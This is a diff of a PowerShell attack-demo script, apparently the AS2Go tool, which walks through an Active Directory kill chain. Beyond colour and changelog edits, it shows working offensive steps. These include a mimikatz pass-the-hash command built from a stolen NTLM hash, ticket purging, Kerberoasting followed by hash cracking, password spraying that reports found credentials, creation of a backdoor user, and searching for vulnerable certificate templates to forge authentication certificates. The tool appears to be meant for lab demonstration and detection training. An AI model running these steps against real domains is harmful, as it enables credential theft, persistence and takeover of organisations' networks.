@@ -46,12 +46,14 @@ https://herrHoZi.com
 ######                                                                     #####
 ################################################################################
 
-# 2022-11-19 | v2.5.6 |  Add new color schema for next command
-# 2022-11-13 | v2.5.5 |  Attack - Steal or Forge Authentication Certificates
-# 2022-11-12 | v2.5.4 |  Update Function Get-DirContent
-# 2022-11-08 | v2.5.3 |  add developer mode switch, add -ScriptBlock {} and region to source code
-# 2022-11-04 | v2.5.2 |  ADD Function New-PasswordSprayAttack
-# 2022-10-15 | v2.5.1 |  ADD Function Kerberoasting
+# 2022-11-24 | v2.5.8 |  Add Function Get-ADGroupNameBasedOnSIDSuffix
+# 2022-11-19 | v2.5.7 |  Add new color schema for next command
+# 2022-11-13 | v2.5.6 |  Add Attack - Steal or Forge Authentication Certificates
+# 2022-11-12 | v2.5.5 |  Update Function Get-DirContent
+# 2022-11-11 | v2.5.4 |  Add Command '| out-host' after write-host in sub functions
+# 2022-11-06 | v2.5.3 |  Add developer mode switch, add -ScriptBlock {} and regions to source code
+# 2022-11-05 | v2.5.2 |  Add Function New-PasswordSprayAttack
+# 2022-10-15 | v2.5.1 |  Add Function Kerberoasting
 # 2022-10-13 | v2.1.1 |  Update Function Start-AS2GoDemo | Protected User Error Routine
 # 2022-10-08 | v2.1.0 |  Update Function New-BackDoorUser
 # 2022-09-20 | v2.0.9 |  Update Get-LocalGroupMember -Group "Administrators" | ft
@@ -86,7 +88,7 @@ Param (
 [bool]$showStep = $true # show the steps in an image
 [bool]$skipstep = $false # show the steps in an image
 
-$lastupdate = "2022-11-19"
+$lastupdate = "2022-11-24"
 $version = "2.5.9.0" 
 $path = Get-Location
 $scriptName = $MyInvocation.MyCommand.Name
@@ -132,13 +134,13 @@ $fgcC = "Yellow"   # Command
 $fgcV = "DarkCyan" # Value
 [string] $fgcF = (get-host).ui.rawui.ForegroundColor
 If ($fgcF-eq "-1") {$fgcF = "White"}
-
+$fgcH = "Yellow" 
 
 $WinVersion = [System.Environment]::OSVersion.Version.ToString()
 
-$GroupDA  = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-512") }).name
-$GroupEA  = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-519") }).name
-$GroupGPO = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-520") }).name
+#$GroupDA  = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-512") }).name
+#$GroupEA  = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-519") }).name
+#$GroupGPO = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-520") }).name
 
 #endregion Global Settings
 
@@ -163,6 +165,8 @@ function MyTemplate {
     Write-Log -Message "### Start Function $myfunction ###"
     #region ################## main code | out- host #####################
 
+    
+
     Write-Log -Message "    >> using $CAtemplate"
     #endregion ####################### main code #########################
     Write-Log -Message "### End Function $myfunction ###"
@@ -170,6 +174,43 @@ function MyTemplate {
     return $true
 }
 
+function Get-ADGroupNameBasedOnSIDSuffix {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####    Description                ######                                 
+    #####                                                                      #####
+    ################################################################################
+
+
+    Param([string] $sIDSuffix)
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+
+    $GroupName = $null
+    $GroupName = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*$sIDSuffix") }).name
+    
+    If ($null -eq $GroupName) {
+
+        switch ($sIDSuffix){
+            "-512" {$GroupName = "Domain Admins"; Break}
+            "-518" {$GroupName = "Schema Admins"; Break}
+            "-519" {$GroupName = "Enterprise Admins";Break}
+            "-520" {$GroupName = "Group Policy Creator Owners";Break}
+            "-525" {$GroupName = "Protected Users";Break}
+            Default {"Nomatches"}
+        }
+
+    }
+
+    Write-Log -Message "    >> using AD Group - $GroupName"
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
+    return $GroupName
+}
 
 #region AS2Go0 Functions
 
@@ -301,24 +342,27 @@ function Start-ConvertingToPfxFromPem {
     }
  
     $StartOpenSSL = Get-KeyValue -key "OpenSSL"
-    #Invoke-Item $StartOpenSSL | Out-Host
     Start-Process -filePath $StartOpenSSL
     
-    Write-Host "Next steps:" -ForegroundColor Yellow
-    Write-Host "-----------" -ForegroundColor Yellow
-    Write-Host " - Change to console "  -NoNewline; Write-Host "Win64 OpenSSL Command Prompt" -ForegroundColor Yellow
+    Write-Host "Next steps:" -ForegroundColor $fgcH
+    Write-Host "-----------" -ForegroundColor $fgcH
+    Write-Host " - Change to console "  -NoNewline; Write-Host "Win64 OpenSSL Command Prompt" -ForegroundColor $fgcH
     Write-Host " - Change directory to C:\temp\AS2GO"
     Write-Host " - Paste the command into the OpenSSL Command Prompt"
     Write-Host " - Save the pfx file with " -NoNewline
-    Write-Host "NO " -NoNewline  -ForegroundColor Yellow; Write-Host "password"
-    Write-Host " - Change back to console " -NoNewline; Write-Host $stage25 -ForegroundColor Yellow
+    Write-Host "NO " -NoNewline  -ForegroundColor $fgcH; Write-Host "password"
+    Write-Host " - Change back to console " -NoNewline; Write-Host $stage25 -ForegroundColor $fgcH
     Write-Host ""
+
+    Pause
+    $StartOpenSSL = Get-KeyValue -key "OpenSSL"
+    Start-Process -filePath $StartOpenSSL
 
     Start-Sleep -Milliseconds 1500
     Get-Process -name cmd | Format-Table name, id, mainWindowTitle | Out-Host
     pause
 
-    write-host "`n  Saved to file:" -ForegroundColor Yellow
+    write-host "`n  Saved to file:" -ForegroundColor $fgcH
     Get-Item $pfxFile | Out-Host
     
     #stop 
@@ -392,7 +436,7 @@ function Start-RequestingCertificate {
         pause
     }
  
-    write-host "`n  Saved to file:" -ForegroundColor Yellow
+    write-host "`n  Saved to file:" -ForegroundColor $fgcH
     Get-Item $pemFile | Out-Host
     pause
 
@@ -428,7 +472,7 @@ function Get-VulnerableCertificateTemplate {
     If ($answer -eq $yes) {
         #find vulnerable CA templates
         Invoke-Command -ScriptBlock { .\certify.exe find /vulnerable } | Out-Host
-        Write-Host "`nFound Vulnerable Certificate Templates - $CAtemplate" -ForegroundColor Yellow
+        Write-Host "`nFound Vulnerable Certificate Templates - $CAtemplate" -ForegroundColor $fgcH
     }
 
     Do {
@@ -479,7 +523,7 @@ function Get-EnterpriseCAName {
     Set-KeyValue -key "EnterpriseCA" -NewValue $answer
 
     Write-Host "`n`nUsing this Enterprise CA for the next steps - " -NoNewline
-    Write-Host "$answer`n`n" -ForegroundColor Yellow
+    Write-Host "$answer`n`n" -ForegroundColor $fgcH
 
     pause
     Write-Log -Message "    >> Using - $answer"
@@ -528,7 +572,7 @@ function Start-KerberoastingAttack {
         pause
         #https://medium.com/geekculture/hashcat-cheat-sheet-511ce5dd7857
         Write-Host "`n"
-        write-host "The next step is " -NoNewline; write-host "cracking" -NoNewline -ForegroundColor Yellow 
+        write-host "The next step is " -NoNewline; write-host "cracking" -NoNewline -ForegroundColor $fgcH 
         Write-host " the roasted hashes. HASHCAT is a good tool." 
         Write-host "Let’s use the example where you know the password policy for the password;" 
         Write-host "Known as Brute-force or mask attack."
@@ -564,9 +608,9 @@ function New-PasswordSprayAttack {
         #The number of failed logon attempts that causes a user account to be locked out is 0;
         #this means the account will NEVER be locked out.
         Write-Host "The number of failed logon attempts that causes a user account to be locked out is " -NoNewline
-        Write-Host $NoLT -ForegroundColor Yellow -NoNewline ; Write-Host ";"
+        Write-Host $NoLT -ForegroundColor $fgcH -NoNewline ; Write-Host ";"
         Write-Host "this means the account will"  -NoNewline
-        Write-Host " NEVER " -ForegroundColor Yellow -NoNewline
+        Write-Host " NEVER " -ForegroundColor $fgcH -NoNewline
         Write-Host "be locked out."
     }
     else {
@@ -574,9 +618,9 @@ function New-PasswordSprayAttack {
         # this means you can run a maximum of [n-1] single 'Password Spray' Attacks.
         [int] $NoPS = $NoLT - 1
         Write-Host "The number of failed logon attempts that causes a user account to be locked out is " -NoNewline
-        Write-Host $NoLT -ForegroundColor Yellow -NoNewline; Write-Host ";"
+        Write-Host $NoLT -ForegroundColor $fgcH -NoNewline; Write-Host ";"
         Write-Host "this means you can run a maximum of " -NoNewline
-        Write-Host $NoPS -ForegroundColor Yellow -NoNewline
+        Write-Host $NoPS -ForegroundColor $fgcH -NoNewline
         Write-Host " single 'Password Spray' Attacks."
     }
 
@@ -620,14 +664,14 @@ function New-PasswordSprayAttack {
 
 
     # example - First run with password zwm1FCxXi2!3+ against 2167 users from OU OU=Demo Accounts,OU=AS2Go,DC=sandbox,DC=corp       
-    Write-Host "`nPW Spray #1 runs against "-NoNewline; Write-Host $NoU -NoNewline -ForegroundColor Yellow
-    Write-Host " users from OU " -NoNewline; Write-Host $MyPath -NoNewline -ForegroundColor Yellow
-    Write-Host " with password " -NoNewline; Write-host $MyPW01 -ForegroundColor Yellow
+    Write-Host "`nPW Spray #1 runs against "-NoNewline; Write-Host $NoU -NoNewline -ForegroundColor $fgcH
+    Write-Host " users from OU " -NoNewline; Write-Host $MyPath -NoNewline -ForegroundColor $fgcH
+    Write-Host " with password " -NoNewline; Write-host $MyPW01 -ForegroundColor $fgcH
 
     # example - Second run with password zwm1FCxXi2!3+ against 2167 users from OU OU=Demo Accounts,OU=AS2Go,DC=sandbox,DC=corp    
-    Write-Host "PW Spray #2 runs against "-NoNewline; Write-Host $NoU -NoNewline -ForegroundColor Yellow
-    Write-Host " users from OU " -NoNewline; Write-Host $MyPath -NoNewline -ForegroundColor Yellow
-    Write-Host " with password " -NoNewline; Write-host $MyPW02 -ForegroundColor Yellow
+    Write-Host "PW Spray #2 runs against "-NoNewline; Write-Host $NoU -NoNewline -ForegroundColor $fgcH
+    Write-Host " users from OU " -NoNewline; Write-Host $MyPath -NoNewline -ForegroundColor $fgcH
+    Write-Host " with password " -NoNewline; Write-host $MyPW02 -ForegroundColor $fgcH
     Write-Host ""
 
 
@@ -638,8 +682,8 @@ function New-PasswordSprayAttack {
 
     If ($DeveloperMode) {
         $user = $MyDomain + "\" + $env:USERNAME
-        Write-Host "`n  Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor Yellow -NoNewline
-        Write-Host " with Password: " -NoNewline; Write-Host $MyPW02 -ForegroundColor Yellow
+        Write-Host "`n  Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor $fgcH -NoNewline
+        Write-Host " with Password: " -NoNewline; Write-Host $MyPW02 -ForegroundColor $fgcH
     }
 
     $question = "Do you also want to run a Password Spray attack with rubues.exe - Y or N? Default "
@@ -702,8 +746,8 @@ Function Start-PasswordSprayAttack {
               
            
         if ($null -ne $Domain_check.name) {
-            Write-Host "Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor Yellow -NoNewline
-            Write-Host " with Password: " -NoNewline; Write-Host $Password -ForegroundColor Yellow
+            Write-Host "Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor $fgcH -NoNewline
+            Write-Host " with Password: " -NoNewline; Write-Host $Password -ForegroundColor $fgcH
         }
     }
 
@@ -932,9 +976,10 @@ Write-Highlight -Text ".\mimikatz.exe ", """privilege::debug"" ""kerberos::purge
         Write-Host "____________________________________________________________________`n" 
         Write-Host "        Displays a list of currently cached Kerberos tickets        "
         Write-Host "____________________________________________________________________`n" 
-            
-        Write-Host "NEXT STEP: " -NoNewline
-        Write-Host "KLIST`n" -ForegroundColor $global:FGCCommand
+        Write-Host ""             
+        Write-Host -NoNewline "  Command: "
+        Write-Highlight -Text ('klist') -Color $fgcC
+        Write-Host ""  
         Pause
         Set-NewColorSchema -NewStage $GoldenTicket
         klist
@@ -1106,7 +1151,7 @@ function Start-UserManipulation {
       
         $EndDate = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
         $duration = NEW-TIMESPAN –Start $StartDate –End $EndDate
-        Write-Host "  'Game over' after just " -NoNewline; Write-Host "$duration [h]" -ForegroundColor Yellow
+        Write-Host "  'Game over' after just " -NoNewline; Write-Host "$duration [h]" -ForegroundColor $fgcH
         pause
     }
 
@@ -1152,7 +1197,7 @@ function Start-UserManipulation {
   
         $EndDate = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
         $duration = NEW-TIMESPAN –Start $StartDate –End $EndDate
-        Write-Host "  'Game over' after just " -NoNewline; Write-Host "$duration [h]`n" -ForegroundColor Yellow
+        Write-Host "  'Game over' after just " -NoNewline; Write-Host "$duration [h]`n" -ForegroundColor $fgcH
         Write-Host ""
         Pause
     }
@@ -1215,8 +1260,8 @@ function New-BackDoorUser {
     Set-ADUser $sSamaccountName -Replace @{thumbnailPhoto = ([byte[]](Get-Content $bthumbnailPhoto -Encoding byte)) } -Initials $Initials -Title $title -Description $sDescription
     Set-KeyValue -key "LastBDUser" -NewValue $sSamaccountName
 
-    Write-Host "`n`nNew backdoor user: " -NoNewline; Write-host $sSamaccountName  -ForegroundColor Yellow
-    Write-host     "current password : " -NoNewline; Write-host $BDUserPW         -ForegroundColor Yellow
+    Write-Host "`n`nNew backdoor user: " -NoNewline; Write-host $sSamaccountName  -ForegroundColor $fgcH
+    Write-host     "current password : " -NoNewline; Write-host $BDUserPW         -ForegroundColor $fgcH
 
     Start-Sleep -Milliseconds 500
     #Get-ADUser -Identity $sSamaccountName -Properties canonicalName, Created,  | Select-Object sAMAccountName, Created, userPrincipalName, name, canonicalName | Format-Table
@@ -1224,14 +1269,14 @@ function New-BackDoorUser {
 
 
 
-    Write-Host "Getting AD Principal Group Membership`n" -ForegroundColor Yellow
+    Write-Host "Getting AD Principal Group Membership`n" -ForegroundColor $fgcH
 
     $i = 0
 
     Do {
         $i += 1
         $members = Get-ADPrincipalGroupMembership -Identity $sSamaccountName
-        Write-host "." -NoNewline -ForegroundColor Yellow
+        Write-host "." -NoNewline -ForegroundColor $fgcH
     } Until (($members.count -gt 3) -or ($i -gt 50))
 
     Write-Host ""
@@ -1703,7 +1748,7 @@ function Get-AS2GoSettings {
         for ($counter = 0; $counter -lt $MyParameter.Length; $counter++ ) {
     
             write-host ([string]$counter).PadLeft(4, ' ') ":" $MyParameter.Get($counter) " = " $MyValue.Get($counter)
-            #write-host $counter ":" $MyParameter.Get($counter) " = " $MyValue.Get($counter) # -ForegroundColor Yellow
+            #write-host $counter ":" $MyParameter.Get($counter) " = " $MyValue.Get($counter) # -ForegroundColor $fgcH
         }
 
 
@@ -1781,45 +1826,25 @@ function Access-Directory {
 
 function Get-SensitveADUser {
 
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $group
-    )
+    Param([string] $group)
 
     $myfunction = Get-FunctionName
     Write-Log -Message "### Start Function $myfunction ###"
-    #####
-
 
     Try {
-
-
-        #$content = Get-ADGroupMember -Identity $group -ErrorAction SilentlyContinue
         Get-ADGroupMember -Identity $group -Recursive | Format-Table SamAccountName, objectClass, name, distinguishedName -ErrorAction SilentlyContinue -AutoSize
     }
-
     catch {
         Write-Host "   --> No ACCESS to group '$group'`n`n" -ForegroundColor $global:FGCError
     }
-    <#
-If ($content)
-{
-    
-}
-else
-{
-    Write-Host "No ACCESS to group $group" -ForegroundColor $global:FGCError
-}
-#>
 
     #####
-    Write-Log -Message $group
+    Write-Log -Message "    >> using $group"
     Write-Log -Message "### End Function $myfunction ###"
 }
 
 function Start-PtH-Attack {
+
     $myfunction = Get-FunctionName
     Write-Log -Message "### Start Function $myfunction ###"
     #####
@@ -1881,11 +1906,10 @@ function Start-PtH-Attack {
         Write-Host ""
         Write-Host "  Compromised User Account - " -NoNewline; Write-Host $helpdeskuser -ForegroundColor $global:FGCHighLight
         Write-Host "  NTML Hash                - " -NoNewline; Write-Host $pthntml      -ForegroundColor $global:FGCHighLight
-
+        Write-Host ""
         Write-Host      -NoNewline "  Command: "
         Write-Highlight -Text ".\mimikatz.exe ", """privilege::","debug", """ ""sekurlsa::","pth", " /user:", $helpdeskuser , " /ntlm:", $pthntml, " /domain:", $fqdn,""" ""exit"""   `
                         -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
-        Write-Host ""
         Write-Host ""
         $question = "Are these values correct - Y or N? Default "
         $prompt = Get-Answer -question $question -defaultValue $yes
@@ -1928,8 +1952,8 @@ function Start-PtH-Attack {
 
 
     Write-Host "`n`nPlease run the following command from the new Terminal Window:`n" -ForegroundColor $global:FGCQuestion
-    Write-Host "00.cmd" -ForegroundColor $global:FGCCommand
-
+    Write-Host "             00.cmd" -ForegroundColor $fgcC
+    Write-Host ""
     Set-KeyValue -key "LastStage" -NewValue $stage20
 
     Stop-Process -ErrorAction SilentlyContinue -Name iexplore -Force 
@@ -2177,7 +2201,7 @@ function Start-Reconnaissance-Part2 {
                     -Color $fgcC, $fgcS, $fgcV, $fgcC, $fgcS
     #Write-Host " Get-ADGroupMember -Identity 'Group Policy Creator Owners' -Recursive | ft" -ForegroundColor $global:FGCCommand
     Write-Host ""
-    Get-SensitveADUser -group "Group Policy Creator Owners"
+    Get-SensitveADUser -group $GroupGPO
     Write-Host ""
     Write-Host ""
     Pause
@@ -2187,12 +2211,12 @@ function Start-Reconnaissance-Part2 {
     Write-Host "____________________________________________________________________`n" 
     
     Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text ("Get-ADGroupMember ", "-Identity ","'Group Policy Creator Owners' ", "-Recursive | ", "FT") `
+    Write-Highlight -Text ("Get-ADGroupMember ", "-Identity ","'Enterprise Admins' ", "-Recursive | ", "FT") `
                     -Color $fgcC, $fgcS, $fgcV, $fgcC, $fgcS
     
     #Write-Host " Get-ADGroupMember -Identity 'Enterprise Admins' -Recursive | ft" -ForegroundColor $global:FGCCommand
     Write-Host ""
-    Get-SensitveADUser -group "Enterprise Admins"
+    Get-SensitveADUser -group $GroupEA
     Write-Host ""
     Pause
     Clear-Host
@@ -2377,6 +2401,13 @@ Function Start-AS2GoDemo {
     Write-Log -Message "."
     Write-Log -Message "Victim PC run on Windows $WinVersion"
 
+
+    $GroupDA    = Get-ADGroupNameBasedOnSIDSuffix -sIDSuffix "-512"
+    $GroupEA    = Get-ADGroupNameBasedOnSIDSuffix -sIDSuffix "-519"
+    $GroupSA    = Get-ADGroupNameBasedOnSIDSuffix -sIDSuffix "-518"
+    $GroupPU    = Get-ADGroupNameBasedOnSIDSuffix -sIDSuffix "-525"
+    $GroupGPO   = Get-ADGroupNameBasedOnSIDSuffix -sIDSuffix "-520"
+
     # check the correct directory and requirements
     $FileVersionA = Confirm-FileAvailabliy -filename "AS2Go.xml"
     $FileVersionM = Confirm-FileAvailabliy -filename "mimikatz.exe"
@@ -2384,6 +2415,7 @@ Function Start-AS2GoDemo {
     $FileVersionR = Confirm-FileAvailabliy -filename "Rubeus.exe"
     $FileVersionN = Confirm-FileAvailabliy -filename "NetSess.exe"
     $FileVersionC = Confirm-FileAvailabliy -filename "Certify.exe"
+    $FileVersionO = Confirm-FileAvailabliy -filename "..\..\Program Files\OpenSSL-Win64\bin\openssl.exe"
 
     Confirm-PoSHModuleAvailabliy -PSModule "ActiveDirectory"
     Import-Module ActiveDirectory
@@ -2419,16 +2451,19 @@ Function Start-AS2GoDemo {
         Write-Host "                                                                    "
         Write-Host "        Attack scenario to GO | along the kill-chain                " -ForegroundColor yellow
         Write-Host "                                                                    "
-        Write-Host "        created by Holger Zimmermann                           "
-        Write-Host "        last update $lastupdate                                      "
+        Write-Host "        created by Holger Zimmermann | last update $lastupdate      "
         Write-Host "                                                                    "
         Write-Host "        Used tools & requirements:                                  "
         Write-Host "                                                                    "
         Write-Host "        ●  ACTIVE DIRECTORY PoSH module                       "
+        Write-Host "                                                                    "
+        Write-Host "        ●  NetSess.exe    $FileVersionN                            "
         Write-Host "        ●  Mimikatz.exe   $FileVersionM                            "
+        Write-Host "                                                                    "
         Write-Host "        ●  Rubeus.exe     $FileVersionR                            "
         Write-Host "        ●  Certify.exe    $FileVersionC                            "
-        Write-Host "        ●  NetSess.exe    $FileVersionN                            "
+        Write-Host "        ●  OpenSSL.exe    $FileVersionO                            "
+        Write-Host "                                                                    "
         Write-Host "        ●  PsExec.exe     $FileVersionP                            "
         Write-Host "____________________________________________________________________`n" 
 
@@ -2454,10 +2489,10 @@ Function Start-AS2GoDemo {
   
             [bool]$showStep = $false
             [bool]$skipstep =$True
-            Write-Host  -ForegroundColor DarkRed "`n                    FYI: Running AS2Go inDeveloper Mode"
+            Write-Host  -ForegroundColor DarkRed "`n                    FYI: Running AS2Go in Developer Mode"
             #Write-Warning "    Running AS2Go in Developer Mode!"
             Write-Host ""
-            Write-Log -Message "Running AS2Go inDeveloper Mode"
+            Write-Log -Message "Running AS2Go in Developer Mode"
         }
 
 
@@ -2563,7 +2598,7 @@ Function Start-AS2GoDemo {
             [bool]$skipstep =$True
             Write-Host ""
             Write-Warning "    Running AS2Go in Developer Mode!`n"
-            Write-Log -Message "Running AS2Go inDeveloper Mode"
+            Write-Log -Message "Running AS2Go in Developer Mode"
         }
 
     }
@@ -2632,6 +2667,7 @@ Function Start-AS2GoDemo {
 
         #Invoke-Command -ScriptBlock {.\certify.exe find /vulnerable}
         Write-host "END Run directy" -ForegroundColor Red
+        Write-Log -Message "Running dedicated function from Developer Mode section"
         pause
 
     }
@@ -2724,8 +2760,8 @@ Function Start-AS2GoDemo {
                 $message.Exception
   
                 Write-Host ""
-                Write-host "  Account restrictions are preventing this user from signing in." -ForegroundColor Yellow
-                Write-HosT "  Probably helpdesk user '$helpdeskuser' is member of the 'Protected Users' Group!`n`n" -ForegroundColor Yellow
+                Write-host "  Account restrictions are preventing this user from signing in." -ForegroundColor $fgcH
+                Write-HosT "  Probably helpdesk user '$helpdeskuser' is member of the 'Protected Users' Group!`n`n" -ForegroundColor $fgcH
                 pause
                 #Stop-AS2GoDemo
             }
@@ -2739,10 +2775,10 @@ Function Start-AS2GoDemo {
             Write-Host "____________________________________________________________________`n" 
             Write-Host "        Displays a list of currently cached Kerberos tickets        "
             Write-Host "____________________________________________________________________`n" 
-            
+            Write-Host ""             
             Write-Host -NoNewline "  Command: "
             Write-Highlight -Text ('klist') -Color $fgcC
-            
+            Write-Host ""           
             Pause
             Write-Host ""
             klist
